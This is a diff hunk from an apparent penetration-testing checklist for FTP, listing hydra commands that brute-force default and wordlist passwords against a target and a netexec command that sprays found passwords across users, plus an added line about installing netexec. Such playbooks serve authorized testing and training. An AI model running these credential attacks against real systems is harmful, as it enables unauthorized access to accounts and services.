@@ -39,7 +39,7 @@ Default logins from a list of user:password pairs:
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f <TargetIP> ftp
 A known user, with blank, same-as-user and reversed passwords tried first:
 hydra -l '<Username>' -P /usr/share/wordlists/rockyou.txt -e nsr -f <TargetIP> ftp
-Found passwords across found users:
+Found passwords across found users. At the pwn-broker prompt: tool install netexec.
 nxc ftp <TargetIP> -u users.txt -p passwords.txt --continue-on-success
 - [ ] Longer guessing, with wordlists built for the target: :Pb brute-force
 - [ ] A working FTP login tried on SSH and every other service: :Pb ssh
